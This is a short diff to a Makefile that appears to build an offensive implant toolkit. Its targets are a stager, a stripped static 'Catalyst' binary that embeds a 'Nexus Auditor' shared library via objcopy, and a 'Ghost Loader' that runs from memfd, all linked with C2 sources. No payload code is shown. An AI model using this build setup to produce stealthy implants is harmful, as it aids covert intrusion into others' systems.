@@ -26,7 +26,7 @@ CC       ?= gcc
 CFLAGS   := -Wall -Wextra -Werror -std=gnu11 -D_GNU_SOURCE
 CFLAGS   += -fno-stack-protector -fno-ident -fvisibility=hidden
 CFLAGS   += -fno-asynchronous-unwind-tables
-LDFLAGS  := -lcrypto -lssl -lpthread
+LDFLAGS  := -lssl -lcrypto -lpthread -ldl -lz
 PIC_FLAGS := -fPIC
 
 # Build mode: debug or release
@@ -107,19 +107,9 @@ stager: $(BUILD_DIR)
 		$(INCLUDES) \
 		$(STAGER_SRC) $(COMMON_SRC) $(C2_SRC) \
 		-o $(STAGER_BIN) \
-		$(LDFLAGS)
+		-lssl -lcrypto -lpthread -ldl
 	@echo "[+] Stager built: $(STAGER_BIN) ($$(stat -c%s $(STAGER_BIN)) bytes)"
 	@sha256sum $(STAGER_BIN)
-
-# ── Catalyst (static, stripped) ──────────────────────────────────────────────
-
-catalyst: $(BUILD_DIR)
-	$(CC) $(CFLAGS) -static -s \
-		$(INCLUDES) \
-		$(CAT_SRC) $(COMMON_SRC) $(C2_SRC) \
-		-o $(CATALYST_BIN) \
-		$(LDFLAGS)
-	@echo "[+] Catalyst built: $(CATALYST_BIN)"
 
 # ── Nexus Auditor (shared library) ──────────────────────────────────────────
 
@@ -128,8 +118,19 @@ nexus_auditor: $(BUILD_DIR)
 		$(INCLUDES) \
 		$(NEXUS_SRC) $(COMMON_SRC) $(C2_SRC) \
 		-o $(NEXUS_SO) \
-		$(LDFLAGS) -ldl
+		-lssl -lcrypto -lpthread -ldl
 	@echo "[+] Nexus Auditor built: $(NEXUS_SO)"
+
+# ── Catalyst (static, stripped) ──────────────────────────────────────────────
+
+catalyst: $(BUILD_DIR) nexus_auditor
+	objcopy -I binary -O elf64-x86-64 -B i386:x86-64 $(NEXUS_SO) build/nexus_auditor.o
+	$(CC) $(CFLAGS) -static -s \
+		$(INCLUDES) \
+		$(CAT_SRC) $(COMMON_SRC) $(C2_SRC) build/nexus_auditor.o \
+		-o $(CATALYST_BIN) \
+		-lssl -lcrypto -lpthread
+	@echo "[+] Catalyst built: $(CATALYST_BIN)"
 
 # ── Ghost Loader (static — runs from memfd) ─────────────────────────────────
 
